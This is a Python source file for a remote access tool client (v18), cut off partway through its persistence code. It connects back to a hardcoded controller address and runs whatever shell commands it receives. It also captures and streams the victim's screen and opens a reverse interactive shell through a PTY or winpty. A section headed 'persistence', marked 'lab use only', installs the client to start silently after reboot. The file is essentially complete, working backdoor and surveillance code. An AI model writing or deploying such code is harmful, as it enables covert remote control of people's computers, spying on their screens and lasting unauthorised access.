# client.py - v18 (instant commands, fast capture, persistent + shell,
#                   screen share in its own thread, Ctrl+B background / Ctrl+Z kill,
#                   queued requests answered, floods cut off not killed)

import base64
import contextlib
import errno
import importlib.util
import io
import json
import os
import platform
import re
import select
import shutil
import signal
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time

DEFAULT_IP = '192.168.0.113'
DEFAULT_PORT = 4449
RETRY_DELAY = 1               # seconds between reconnect attempts
MAX_FILE = 50 * 1024 * 1024   # 50 MB
MAX_MSG = 96 * 1024 * 1024    # sanity bound for one protocol message
MAX_OUTPUT = 8 * 1024 * 1024  # keep this much output; a flood is cut off, not killed
SCREEN_SIZE = (960, 540)      # screen share frame size (width, height)
SCREEN_JPEG_QUALITY = 70      # JPEG quality for streamed frames
SCREENSHOT_JPEG_QUALITY = 85  # JPEG quality for one-shot screenshots
SCREEN_SEND_TIMEOUT = 5       # seconds a frame send may block before we give up
KEEPALIVE_IDLE = 5            # seconds of silence before TCP keepalive probes start
KEEPALIVE_INTERVAL = 3        # seconds between keepalive probes
KEEPALIVE_COUNT = 3           # failed probes before the connection is declared dead
SCRIPT_PATH = os.path.abspath(__file__)                            # what autorun restarts
AUTORUN_NAME = os.path.splitext(os.path.basename(SCRIPT_PATH))[0]  # -> 'client'


def _tune_socket(sock):
    """Low latency + fast dead-controller detection.

    On VM/NAT setups the FIN of a killed controller can get lost, leaving the
    client blocked on a half-open connection forever (that was the "must log
    out of the VM to reconnect" bug). Tuned keepalives make the kernel notice
    a dead peer within ~15 seconds, so the reconnect loop below takes over.
    They also keep VMware NAT mappings from expiring while idle."""
    try:
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except OSError:
        pass
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    except OSError:
        return
    try:
        if hasattr(socket, 'TCP_KEEPIDLE'):            # Linux
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, KEEPALIVE_IDLE)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, KEEPALIVE_INTERVAL)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, KEEPALIVE_COUNT)
        elif hasattr(socket, 'TCP_KEEPALIVE'):         # macOS
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPALIVE, KEEPALIVE_IDLE)
    except OSError:
        pass
    if os.name == 'nt':
        try:
            sock.ioctl(socket.SIO_KEEPALIVE_VALS,
                       (1, KEEPALIVE_IDLE * 1000, KEEPALIVE_INTERVAL * 1000))
        except (AttributeError, OSError):
            pass


def _socket_writable(sock, timeout):
    """True when the socket can take more data without hanging (a stuck or
    vanished peer stops being writable once its TCP window fills up)."""
    try:
        _, writable, _ = select.select([], [sock], [], timeout)
    except OSError:
        return False
    return bool(writable)


def recv_exact(conn, n):
    chunks = []
    while n > 0:
        chunk = conn.recv(min(n, 262144))
        if not chunk:
            return None
        chunks.append(chunk)
        n -= len(chunk)
    return b''.join(chunks)


SEND_LOCK = threading.Lock()    # one writer at a time: frames and replies
CANCELED = {}                   # request ids the controller stopped -> why (Ctrl+Z/stop)
CANCELED_LOCK = threading.Lock()
DEFERRED = []                   # requests that arrived while a command was running


def send_msg(conn, obj):
    """Send one JSON message.

    A screen share runs in its own thread, so two threads can be sending at
    the same time: without the lock their 4-byte length headers and payloads
    would interleave and desync the whole protocol."""
    payload = json.dumps(obj).encode('utf-8')
    with SEND_LOCK:
        conn.sendall(len(payload).to_bytes(4, 'big') + payload)


def _mark_canceled(req_id, why='Ctrl+Z'):
    """Remember a canceled request so it is skipped when the client picks it up."""
    if req_id is None:
        return
    with CANCELED_LOCK:
        CANCELED[req_id] = why
        if len(CANCELED) > 512:     # defensive bound; entries free up as they arrive
            CANCELED.clear()


def _is_canceled(req_id):
    if req_id is None:
        return False
    with CANCELED_LOCK:
        return req_id in CANCELED


def _forget_canceled(req_id):
    """Drop a canceled id and report why it was canceled (None if unknown)."""
    if req_id is None:
        return None
    with CANCELED_LOCK:
        return CANCELED.pop(req_id, None)


def recv_msg(conn):
    try:
        header = recv_exact(conn, 4)
        if header is None:
            return None
        size = int.from_bytes(header, 'big')
        if size > MAX_MSG:              # desynced/garbage stream - reconnect
            return None
        payload = recv_exact(conn, size)
        if payload is None:
            return None
        return json.loads(payload.decode('utf-8'))
    except (OSError, ValueError):
        return None


PREV_DIR = None                 # remembered so 'cd -' works like in a real shell


def change_dir(command, current_dir):
    """Intercept a plain 'cd' so the directory persists between commands.
    Returns (new_dir, output_or_None), or None if it's not a plain cd."""
    global PREV_DIR
    cmd = command.strip()
    low = cmd.lower()
    if low != 'cd' and not low.startswith('cd '):
        return None
    if any(op in cmd for op in ('&&', '||', ';', '|')):
        return None  # compound command: let the shell run it

    target = cmd[2:].strip()
    if os.name == 'nt' and target.lower().startswith('/d '):   # Windows: cd /d C:\path
        target = target[3:].strip()
    if len(target) >= 2 and target[0] == target[-1] and target[0] in ('"', "'"):
        target = target[1:-1]

    if target == '':
        return current_dir, current_dir      # bare 'cd' prints the directory

    target = os.path.expandvars(os.path.expanduser(target))
    if target == '-':                        # 'cd -' -> the previous directory
        if PREV_DIR and os.path.isdir(PREV_DIR):
            return PREV_DIR, PREV_DIR
        return current_dir, 'cd: OLDPWD not set'

    new_dir = target if os.path.isabs(target) else os.path.join(current_dir, target)
    new_dir = os.path.normpath(new_dir)
    if os.path.isdir(new_dir):
        PREV_DIR = current_dir
        return new_dir, None
    if os.path.exists(new_dir):
        return current_dir, "cd: {}: Not a directory".format(target)
    return current_dir, "cd: {}: No such file or directory".format(target)


def ensure_dependencies():
    """Make sure Pillow (screen capture) is importable, installing it with
    pip when it is missing. Returns True if it is ready."""
    try:
        import PIL
    except ImportError:
        PIL = None

    if PIL is None:
        print("[+] Pillow (screen capture) is not installed - trying to install it automatically...")
        python = sys.executable or 'python'

        # Bootstrap pip when even that is missing (fresh Windows Python,
        # pure Arch without python-pip, ...)
        try:
            has_pip = subprocess.run([python, '-m', 'pip', '--version'],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0
        except Exception:
            has_pip = False
        if not has_pip:
            print("[+] pip is missing too - trying to bootstrap it with ensurepip...")
            for bootstrap in ([python, '-m', 'ensurepip', '--upgrade'],
                              [python, '-m', 'ensurepip', '--upgrade', '--user']):
                try:
                    if subprocess.run(bootstrap, stdout=subprocess.DEVNULL,
                                      stderr=subprocess.DEVNULL, timeout=300).returncode == 0:
                        break
                except Exception:
                    pass

        # Try every way a machine may accept a pip install:
        #  - normal venv/Windows install
        #  - user site (works without root)
        #  - PEP 668 distros (Arch, Fedora 38+, Kali/Debian 12+, Mint 22+)
        #    block system pip, so also try the escape hatch, with and without --user
        attempts = [
            [python, '-m', 'pip', 'install', 'pillow'],
            [python, '-m', 'pip', 'install', '--user', 'pillow'],
            [python, '-m', 'pip', 'install', '--break-system-packages', 'pillow'],
            [python, '-m', 'pip', 'install', '--break-system-packages', '--user', 'pillow'],
        ]
        for cmd in attempts:
            try:
                print("[+] Running: {}".format(' '.join(cmd)))
                if subprocess.run(cmd, timeout=600).returncode == 0:
                    break
            except Exception as e:
                print("[!] Installer failed: {}".format(e))

        try:
            import PIL
        except ImportError:
            PIL = None

        # Last resort: the distro's own package manager (needs root)
        if PIL is None and hasattr(os, 'geteuid') and os.geteuid() == 0:
            for tool, cmd in (
                    ('pacman', ['pacman', '-S', '--noconfirm', '--needed',
                                'python-pillow', 'grim']),
                    ('apt-get', ['apt-get', 'install', '-y', 'python3-pil']),
                    ('dnf', ['dnf', 'install', '-y', 'python3-pillow']),
                    ('zypper', ['zypper', '--non-interactive', 'install', 'python3-Pillow'])):
                if not shutil.which(tool):
                    continue
                try:
                    print("[+] Running: {}".format(' '.join(cmd)))
                    subprocess.run(cmd, timeout=600)
                except Exception as e:
                    print("[!] {} failed: {}".format(tool, e))
                    continue
                try:
                    import PIL
                    break
                except ImportError:
                    continue

        try:
            import PIL
        except ImportError:
            print("[!] Could not install Pillow automatically. Install it by hand:")
            print("    Windows:           py -m pip install pillow")
            print("    Arch Linux:        sudo pacman -S python-pillow grim")
            print("    Kali/Debian/Mint:  sudo apt install python3-pil")
            print("    Fedora:            sudo dnf install python3-pillow")
            return False

    if sys.platform.startswith('linux') and os.environ.get('WAYLAND_DISPLAY'):
        desktop = os.environ.get('XDG_CURRENT_DESKTOP', 'unknown').split(':')[0]
        available = [t for t in ('grim', 'spectacle', 'scrot') if shutil.which(t)]
        print("[+] Wayland session ({}): capture helpers found: {}.".format(
            desktop, ', '.join(available) if available else 'none'))

    print("[+] Screen capture ready (Pillow {}).".format(PIL.__version__))
    return True


class CaptureError(RuntimeError):
    """Screen capture failed - carries the per-backend details so the
    controller can show what was tried and how to fix it."""

    def __init__(self, message, attempts):
        super().__init__(message)
        self.attempts = attempts


def distro_info():
    """(distro id, pretty name), from /etc/os-release where available."""
    if not sys.platform.startswith('linux'):
        return (platform.system().lower() or 'unknown',
                '{} {}'.format(platform.system(), platform.release()))
    try:
        with open('/etc/os-release') as f:
            info = dict(line.strip().split('=', 1) for line in f if '=' in line)
        distro_id = info.get('ID', 'linux').strip('"').lower()
        name = info.get('PRETTY_NAME', info.get('NAME', 'Linux')).strip('"')
        return distro_id, name
    except Exception:
        return 'linux', 'Linux'


def environment_report():
    """What this machine has for screen capture. Sent to the controller on
    connect (and with capture errors) so it can explain anything missing."""
    distro_id, distro_name = distro_info()
    if sys.platform.startswith('linux'):
        session = ('wayland' if os.environ.get('WAYLAND_DISPLAY') else
                   'x11' if os.environ.get('DISPLAY') else 'none')
        desktop = os.environ.get('XDG_CURRENT_DESKTOP') or 'unknown'
    else:
        session = 'desktop'
        desktop = platform.system()
    try:
        import PIL
        pillow = getattr(PIL, '__version__', 'present')
    except ImportError:
        pillow = None
    try:
        has_pyautogui = importlib.util.find_spec('pyautogui') is not None
    except Exception:
        has_pyautogui = False
    helpers = {
        'pillow': pillow,
        'pyautogui': has_pyautogui,
        'grim': shutil.which('grim') is not None,
        'spectacle': shutil.which('spectacle') is not None,
        'gnome_dbus': shutil.which('gdbus') is not None,
        'gnome_screenshot': shutil.which('gnome-screenshot') is not None,
        'imagemagick': bool(shutil.which('import') or shutil.which('magick')),
        'scrot': shutil.which('scrot') is not None,
        'maim': shutil.which('maim') is not None,
    }
    if sys.platform.startswith('win'):
        os_name = 'windows'
    elif sys.platform.startswith('linux'):
        os_name = 'linux'
    else:
        os_name = platform.system().lower()
    return {
        'os': os_name,
        'distro': distro_id,
        'distro_name': distro_name,
        'session': session,
        'desktop': desktop,
        'python': '{}.{}.{}'.format(*sys.version_info[:3]),
        'helpers': helpers,
    }


def _capture_diag(exc):
    """Structured details about a capture failure, for the controller."""
    env = environment_report()
    helpers = env['helpers']
    if env['session'] == 'none':
        category = 'no_session'
    elif not any(helpers.get(k) for k in
                 ('pillow', 'pyautogui', 'grim', 'spectacle', 'gnome_screenshot',
                  'gnome_dbus', 'imagemagick', 'scrot', 'maim')):
        category = 'missing_deps'
    else:
        category = 'all_failed'
    return {
        'kind': 'capture',
        'category': category,
        'attempts': list(getattr(exc, 'attempts', [])) or [str(exc)],
        'env': env,
    }


def grab_screen():
    """Take one screenshot from wherever this client runs.

    Fast and silent paths first: Pillow's ImageGrab on Windows/macOS/X11
    (that is what used to make screenshots instant), and on Wayland the
    desktop's own tool (grim on Hyprland/Sway, spectacle on KDE, the shell
    API on GNOME) because Pillow only sees XWayland there. Everything else
    is a quiet fallback: nothing in this chain opens a window of its own
    (tools that do, like gnome-screenshot or xfce4-screenshooter, used to
    make a capture take up to a minute - they are not used anymore). On a
    Wayland session a solid-colour picture from an X11 tool is rejected:
    that is XWayland's blank root."""
    try:
        import PIL  # noqa: F401
    except ImportError:
        ensure_dependencies()

    def _load(data):
        from PIL import Image
        return Image.open(io.BytesIO(data)).convert('RGB')

    def from_stdout(cmd):
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=15)
        if proc.returncode != 0 or not proc.stdout:
            raise RuntimeError('exit status {}'.format(proc.returncode))
        return _load(proc.stdout)

    def from_file(cmd):
        tmp = os.path.join(tempfile.gettempdir(), 'client_shot_{}.png'.format(os.getpid()))
        try:
            proc = subprocess.run(cmd + [tmp], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15)
            if proc.returncode != 0 or not os.path.exists(tmp):
                raise RuntimeError('exit status {}'.format(proc.returncode))
            with open(tmp, 'rb') as f:
                return _load(f.read())
        finally:
            try:
                os.remove(tmp)
            except OSError:
                pass

    wayland = sys.platform.startswith('linux') and (
        os.environ.get('XDG_SESSION_TYPE', '').lower() == 'wayland'
        or bool(os.environ.get('WAYLAND_DISPLAY')))
    desktop = os.environ.get('XDG_CURRENT_DESKTOP', '').lower()

    # name -> (command line, how the picture comes back)
    helpers = {
        'grim': (['grim', '-t', 'jpeg', '-'], from_stdout),          # wlroots Wayland (Hyprland/Sway)
        'spectacle': (['spectacle', '-b', '-n', '-f', '-o'], from_file),    # KDE Plasma
        'gnome': (['gdbus', 'call', '--session', '--dest', 'org.gnome.Shell.Screenshot',
                   '--object-path', '/org/gnome/Shell/Screenshot', '--method',
                   'org.gnome.Shell.Screenshot.Screenshot', 'true', 'false'], from_file),  # GNOME
        'magick': (['import', '-window', 'root', 'png:-'], from_stdout),    # ImageMagick (X11)
        'scrot': (['scrot', '-o'], from_file),                       # X11, silent
        'maim': (['maim'], from_file),                               # X11, silent
    }
    # tools whose Wayland output would be XWayland's (blank) root window
    x11_tools = {'Pillow', 'pyautogui', 'magick', 'scrot', 'maim'}

    def capture(name):
        if name == 'Pillow':
            from PIL import ImageGrab
            img = ImageGrab.grab().convert('RGB')
        elif name == 'pyautogui':
            import pyautogui    # NOTE: may sys.exit() on Linux without tkinter
            img = pyautogui.screenshot().convert('RGB')
        else:
            cmd, grab = helpers[name]
            img = grab(cmd)
        if wayland and name in x11_tools:
            lo, hi = img.convert('L').getextrema()
            if lo == hi:             # flat picture: not a real capture
                raise RuntimeError('empty XWayland picture (solid colour)')
        return img

    linux = sys.platform.startswith('linux')
    if wayland:
        # Wayland: the desktop's own tool is the only real option (Pillow
        # would only see XWayland), so keep the old order there.
        if 'kde' in desktop or 'plasma' in desktop:
            order = ['spectacle', 'grim']
        elif 'gnome' in desktop:
            order = ['gnome', 'grim']
        else:                        # Hyprland, Sway, ...
            order = ['grim', 'spectacle', 'gnome']
        order += ['magick', 'Pillow', 'scrot', 'maim']
    elif linux:
        # X11: Pillow first again (instant and silent, exactly like before);
        # only quiet tools follow - none of them can open a window.
        order = ['Pillow', 'pyautogui', 'magick', 'scrot', 'maim']
    else:
        # Windows / macOS: Pillow, with pyautogui as the only backup
        order = ['Pillow', 'pyautogui']
    order = list(dict.fromkeys(order))

    errors = []
    for name in order:
        try:
            return capture(name)
        except BaseException as e:
            if isinstance(e, FileNotFoundError):
                detail = 'not installed (not found in PATH)'
            else:
                detail = str(e)
            errors.append('{}: {}'.format(name, detail))

    raise CaptureError(
        'no screen capture available ({}). Windows: py -m pip install pillow; '
        'Debian/Kali/Mint: sudo apt install python3-pil; Fedora: sudo dnf install '
        'python3-pillow; Arch: sudo pacman -S python-pillow grim'.format(
            ' | '.join(errors)),
        errors)


def _send_frame(conn, jpeg):
    """Write one JPEG frame ('\\x01' marks it as a frame, not JSON)."""
    payload = b'\x01' + jpeg
    with SEND_LOCK:
        if not _socket_writable(conn, SCREEN_SEND_TIMEOUT):
            raise OSError('controller stopped reading the stream')
        conn.sendall(len(payload).to_bytes(4, 'big') + payload)


def stream_screen(conn, fps=None, stop_event=None, req_id=None):
    """Capture this machine's screen and stream it to the controller as JPEG
    frames until stop_event is set or the connection breaks.

    This runs in its own thread, so the controller can keep sending commands
    while the screen is shared (that is what its Ctrl+B/'jobs' feature is for).
    The final message carries the id of the request that started the stream,
    so the controller knows exactly which operation ended."""
    interval = None
    if fps:
        try:
            interval = 1.0 / max(1, min(int(fps), 60))
        except (TypeError, ValueError):
            interval = None

    failed = False
    while stop_event is None or not stop_event.is_set():
        start = time.time()
        try:
            img = grab_screen()
            img = img.resize(SCREEN_SIZE)                 # PIL resize: (width, height)
            buf = io.BytesIO()
            img.save(buf, 'JPEG', quality=SCREEN_JPEG_QUALITY)
        except Exception as e:
            send_msg(conn, {'type': 'error', 'id': req_id,
                            'data': 'screenshot failed: {}'.format(e),
                            'diag': _capture_diag(e)})
            failed = True
            break

        _send_frame(conn, buf.getvalue())                 # OSError -> reconnect

        if interval:
            elapsed = time.time() - start
            if elapsed < interval:
                time.sleep(interval - elapsed)

    if not failed:
        send_msg(conn, {'type': 'output', 'id': req_id,
                        'data': '[client] screen share stopped'})


STREAM_LOCK = threading.Lock()
STREAM = {'thread': None, 'stop': None, 'id': None}


def stream_running():
    with STREAM_LOCK:
        thread = STREAM['thread']
        return thread is not None and thread.is_alive()


def stop_stream(wait=1.5):
    """Ask a running screen share to finish (it sends the closing message).
    Returns False when nothing was streaming."""
    with STREAM_LOCK:
        stop_event = STREAM['stop']
        thread = STREAM['thread']
    if stop_event is None:
        return False
    stop_event.set()
    if thread is not None and thread is not threading.current_thread():
        thread.join(wait)               # give it a moment to send the closing note
    return True


def _stream_worker(conn, fps, stop_event, req_id):
    """Thread body for one screen share."""
    try:
        stream_screen(conn, fps, stop_event, req_id)
    except Exception as e:
        print('[!] screen share stopped: {}'.format(e))
    finally:
        with STREAM_LOCK:
            if STREAM['thread'] is threading.current_thread():
                STREAM['thread'] = None
                STREAM['stop'] = None
                STREAM['id'] = None


def take_screenshot(conn, req_id=None):
    """Send one full-resolution screenshot as a JPEG image."""
    try:
        img = grab_screen()
        buf = io.BytesIO()
        img.save(buf, 'JPEG', quality=SCREENSHOT_JPEG_QUALITY)
    except Exception as e:
        send_msg(conn, {'type': 'error', 'id': req_id,
                        'data': 'screenshot failed: {}'.format(e),
                        'diag': _capture_diag(e)})
        return
    send_msg(conn, {'type': 'image', 'id': req_id, 'name': 'screenshot.jpg',
                    'data': base64.b64encode(buf.getvalue()).decode('ascii')})


# ---------------------------------------------------------------------------
# Interactive shell ("shell" command): reverse_shell.py's agent injected
# here. When the controller asks for a shell, it opens a fresh port and we
# connect back to it and bridge a real PTY (Unix) or winpty (Windows) until
# the session ends. The main command connection keeps working meanwhile.
# ---------------------------------------------------------------------------

SHELL_CONNECT_TIMEOUT = 10      # seconds to keep retrying the controller's shell port
SHELL_HANDSHAKE_TIMEOUT = 10    # seconds to wait for the terminal-size handshake
SHELL_BUSY = threading.Lock()   # one interactive shell at a time


def _recv_exact(sock, n):
    """Read exactly n bytes from a socket (shell handshake)."""
    buf = b''
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError('peer closed during handshake')
        buf += chunk
    return buf


def _connect_shell(host, port):
    """Connect to the controller's shell port, retrying briefly so a slow
    accept on the controller side cannot lose the session."""
    deadline = time.time() + SHELL_CONNECT_TIMEOUT
    while True:
        try:
            sock = socket.create_connection((host, port), timeout=5)
        except OSError:
            if time.time() >= deadline:
                raise
            time.sleep(0.25)
            continue
        sock.settimeout(None)
        _tune_socket(sock)
        try:
            sock.set_inheritable(False)     # never leak into the shell child
        except (AttributeError, OSError):
            pass
        return sock


def _pty_write_all(fd, data):
    """os.write() on a PTY master can short-write; loop until done."""
    view = memoryview(data)
    while view:
        view = view[os.write(fd, view):]


def _shell_unix(sock, rows, cols):
    """Bridge a real interactive shell (PTY) to the controller's socket."""
    import fcntl
    import pty
    import signal
    import termios

    pid, master_fd = pty.fork()
    if pid == 0:
        # Child: drop the socket, make the PTY a sane terminal, exec a shell.
        try:
            os.close(sock.fileno())
        except OSError:
            pass
        try:
            attrs = termios.tcgetattr(0)
            attrs[0] |= termios.ICRNL
            attrs[3] |= termios.ICANON | termios.ECHO | termios.ISIG
            termios.tcsetattr(0, termios.TCSANOW, attrs)
        except Exception:
            pass
        shell = os.environ.get('SHELL', '/bin/bash')
        if not os.path.exists(shell):
            shell = '/bin/bash' if os.path.exists('/bin/bash') else '/bin/sh'
        os.execvp(shell, [shell, '-i'])
        os._exit(1)

    if rows > 0 and cols > 0:
        try:
            fcntl.ioctl(master_fd, termios.TIOCSWINSZ,
                        struct.pack('HHHH', rows, cols, 0, 0))
        except OSError:
            pass

    try:
        while True:
            readable, _, _ = select.select([sock, master_fd], [], [])
            if sock in readable:
                data = sock.recv(65536)
                if not data:
                    break
                try:
                    _pty_write_all(master_fd, data)
                except OSError:
                    break               # shell exited, PTY master closed
            if master_fd in readable:
                try:
                    data = os.read(master_fd, 65536)
                except OSError as e:
                    if e.errno == errno.EIO:
                        break           # Linux: EIO == EOF when the slave closes
                    raise
                if not data:
                    break
                try:
                    sock.sendall(data)
                except OSError:
                    break
    finally:
        try:
            os.kill(pid, signal.SIGTERM)
        except ProcessLookupError:
            pass
        try:
            os.waitpid(pid, 0)          # reap the child
        except ChildProcessError:
            pass
        try:
            os.close(master_fd)
        except OSError:
            pass


def _shell_windows(sock, rows, cols):
    """Bridge a PowerShell/cmd console (winpty) to the controller's socket."""
    try:
        import winpty                   # pywinpty >= 3.0.5: pip install pywinpty
    except ImportError:
        print('[!] pywinpty is not installed - using the pipe fallback.')
        _shell_windows_pipes(sock)
        return

    shell = 'powershell.exe' if shutil.which('powershell.exe') else 'cmd.exe'
    pty = winpty.PtyProcess.spawn(shell, dimensions=(rows, cols))

    stop = threading.Event()

    def reader():
        try:
            while not stop.is_set():
                data = pty.read()       # returns str (Unicode) in pywinpty v3+
                if not data:            # None or empty -> EOF
                    break
                if isinstance(data, str):
                    data = data.encode('utf-8', 'replace')
                sock.sendall(data)
        except Exception:
            pass
        finally:
            stop.set()

    threading.Thread(target=reader, daemon=True).start()

    try:
        while not stop.is_set():
            readable, _, _ = select.select([sock], [], [], 0.2)
            if not readable:
                continue                        # lets us notice shell exit
            data = sock.recv(65536)
            if not data:
                break
            data = re.sub(br'\r(?!\n)', b'\r\n', data)   # lone \r -> \r\n
            pty.write(data.decode('utf-8', 'replace'))
    except (OSError, ConnectionError, EOFError):
        pass
    finally:
        stop.set()
        try:
            pty.terminate()
        except Exception:
            pass


def _shell_windows_pipes(sock):
    """Fallback when pywinpty is unavailable (cmd/powershell via pipes)."""
    shell = 'powershell.exe' if shutil.which('powershell.exe') else 'cmd.exe'
    proc = subprocess.Popen([shell], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, bufsize=0,
                            close_fds=True)     # never inherit socket handles

    def pump():
        try:
            while True:
                chunk = os.read(proc.stdout.fileno(), 4096)
                if not chunk:
                    break
                sock.sendall(chunk)
        except OSError:
            pass
        finally:
            try:
                sock.shutdown(socket.SHUT_WR)
            except OSError:
                pass

    threading.Thread(target=pump, daemon=True).start()

    try:
        while True:
            data = sock.recv(65536)
            if not data:
                break
            data = re.sub(br'\r(?!\n)', b'\r\n', data)
            proc.stdin.write(data)
            proc.stdin.flush()
    except (OSError, BrokenPipeError):
        pass
    finally:
        try:
            proc.kill()
        except Exception:
            pass


def _interactive_shell_thread(host, port):
    """Background worker: run one interactive shell session for the controller."""
    sock = None
    try:
        try:
            sock = _connect_shell(host, port)
        except OSError as e:
            print('[!] shell: could not reach the controller shell port: {}'.format(e))
            return

        try:                            # terminal-size handshake (rows, cols)
            sock.settimeout(SHELL_HANDSHAKE_TIMEOUT)
            rows, cols = struct.unpack('!HH', _recv_exact(sock, 4))
            sock.settimeout(None)
        except Exception as e:
            print('[!] shell: handshake failed: {}'.format(e))
            return
        if rows <= 0 or cols <= 0:
            rows, cols = 24, 80

        print('[+] Interactive shell session started ({}x{}).'.format(rows, cols))
        if os.name == 'nt':
            _shell_windows(sock, rows, cols)
        else:
            _shell_unix(sock, rows, cols)
        print('[+] Interactive shell session ended.')
    except Exception as e:
        print('[!] shell session error: {}'.format(e))
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
        SHELL_BUSY.release()


def start_interactive_shell(control_socket, host, port, req_id=None):
    """Handle a 'shell' request from the controller: one interactive shell,
    in the background, so the main command connection keeps working."""
    if not SHELL_BUSY.acquire(blocking=False):
        send_msg(control_socket, {'type': 'error', 'id': req_id,
                                  'data': 'an interactive shell is already running'})
        return
    try:
        threading.Thread(target=_interactive_shell_thread, args=(host, port),
                         name='interactive-shell', daemon=True).start()
    except Exception as e:
        SHELL_BUSY.release()
        send_msg(control_socket, {'type': 'error', 'id': req_id, 'data': 'shell: {}'.format(e)})


# ---------------------------------------------------------------------------
# Command control ("cancel"): commands run in their own process group so
# the controller can stop a long one (Ctrl+Z there) and keep the client alive.
# ---------------------------------------------------------------------------

def _kill_process(proc):
    """Stop a running command, children included."""
    if proc.poll() is not None:
        return
    if os.name == 'nt':
        try:
            subprocess.run(['taskkill', '/F', '/T', '/PID', str(proc.pid)],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                           timeout=10)
            return
        except Exception:
            pass
        try:
            proc.kill()
        except Exception:
            pass
        return

    try:
        group = os.getpgid(proc.pid)
    except OSError:
        group = None
    for sig, grace in ((signal.SIGTERM, 1.0), (signal.SIGKILL, 2.0)):
        try:
            if group is not None:
                os.killpg(group, sig)
            else:
                proc.send_signal(sig)
        except OSError:
            return
        try:
            proc.wait(timeout=grace)
            return
        except subprocess.TimeoutExpired:
            continue


def run_command(conn, command, current_dir, req_id=None):
    """Run one shell command and return (output_text, stop).

    The command gets its own session/process group, so the whole tree can be
    killed when the controller sends 'cancel' with this request's id (its
    Ctrl+Z) or when the control connection dies. stop=True means the
    controller asked us to exit. Requests that arrive while the command runs
    are queued (DEFERRED) instead of being dropped, so a background
    operation on the controller side still gets its answer."""
    if os.name == 'nt':
        kwargs = {'creationflags': subprocess.CREATE_NEW_PROCESS_GROUP}
    else:
        kwargs = {'start_new_session': True}
    try:
        proc = subprocess.Popen(command, shell=True, cwd=current_dir,
                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                **kwargs)
    except Exception as e:
        return '{}'.format(e), False

    chunks = []
    size = [0]
    last_data = [time.time()]
    reader_done = threading.Event()

    def reader():
        try:
            while True:
                data = os.read(proc.stdout.fileno(), 65536)
                if not data:
                    break
                last_data[0] = time.time()
                if size[0] < MAX_OUTPUT:
                    chunks.append(data)
                    size[0] += len(data)
        except OSError:
            pass
        finally:
            reader_done.set()

    reader_thread = threading.Thread(target=reader, daemon=True)
    reader_thread.start()

    killed = truncated = stop = disconnected = False
    kill_why = 'Ctrl+Z'
    while True:
        if size[0] >= MAX_OUTPUT and not truncated:
            # The command writes faster than any link could carry: stop
            # collecting output (the reader thread keeps draining the pipe, so
            # the command never blocks on it). The command itself keeps running
            # - Ctrl+Z / 'stop' on the controller is what ends it.
            truncated = True
        exited = proc.poll() is not None
        if exited and reader_done.is_set():
            break
        if exited and (time.time() - last_data[0]) > 0.5:
            break       # command gone, but a child still holds stdout open
        # Wait for a control message - or, on POSIX, for the command's output
        # pipe to hit EOF, which happens the instant it exits. That is what
        # makes a short command return immediately instead of waiting for a
        # poll tick (this was a fixed 200 ms cost on every single command).
        if os.name == 'nt':
            watch, timeout = [conn], 0.02        # Windows: sockets only in select
        else:
            watch, timeout = [conn, proc.stdout], 0.2
        readable, _, _ = select.select(watch, [], [], timeout)

        if conn in readable:
            msg = recv_msg(conn)
            if msg is None:                     # controller gone: stop, reconnect
                _kill_process(proc)
                disconnected = True
                break
            mtype = msg.get('type')
            if mtype == 'cancel':
                # Ctrl+Z / 'stop' on the controller: it names the request to stop.
                target = msg.get('id')
                why = msg.get('why') or 'Ctrl+Z'
                if target is None or target == req_id:
                    kill_why = why
                    _kill_process(proc)
                    killed = True
                else:
                    _mark_canceled(target, why)  # a queued request: skip it later
            elif mtype == 'cmd_kill':           # older controller: stop this one
                _kill_process(proc)
                killed = True
            elif mtype == 'screenshare_stop':
                stop_stream(wait=0.5)           # a share can run next to a command
            elif mtype == 'exit':
                _kill_process(proc)
                stop = True
                break
            else:
                # A request sent while this command runs (the controller can
                # have several operations in flight now): answer it once this
                # command is done instead of dropping it - dropping it would
                # leave that operation hanging forever.
                DEFERRED.append(msg)
            continue

        if os.name != 'nt' and proc.stdout in readable:
            time.sleep(0.001)           # output flowing: let the reader drain it
            continue

    reader_thread.join(timeout=1)
    text = b''.join(chunks).decode('utf-8', errors='replace')
    notes = []
    if killed:
        notes.append('[client] command stopped by the controller ({})'.format(kill_why))
    if disconnected:
        notes.append('[client] controller disconnected - command stopped')
    if truncated:
        notes.append('[client] output cut off after {} MB (the command kept running)'.format(
            '{:g}'.format(round(MAX_OUTPUT / (1024.0 * 1024.0), 2))))
    if notes:
        if text and not text.endswith('\n'):
            text += '\n'
        text += '\n'.join(notes)
    return text, stop


# ---------------------------------------------------------------------------
# Auto-start ("persistence"): the client can install itself so it starts
# quietly after a reboot/logon. Based on autorunner.py - lab use only.
# ---------------------------------------------------------------------------

def get_os_info():
    os_type = platform.system().lower()
    if os_type == 'linux':
        try:
            with open('/etc/os-release') as f:
                info = dict(line.strip().split('=', 1) for line in f if '=' in line)
            return 'Linux ({})'.format(info.get('NAME', 'Generic Linux').strip('"'))
        except OSError:
            return 'Linux (Unknown Distro)'
    if os_type == 'windows':
        return 'Windows {}'.format(platform.release())
    return platform.system()


def is_omarchy():
    if platform.system().lower() != 'linux':
        return False
    try:
        with open('/etc/os-release') as f:
            return 'omarchy' in f.read().lower()
    except OSError:
        return False


def _user_manager_running():
    try:
        return os.path.isdir('/run/user/{}/systemd'.format(os.getuid()))
    except AttributeError:
        return False


def run_quiet(cmd):
    """Run a setup command; True when it succeeded."""
    try:
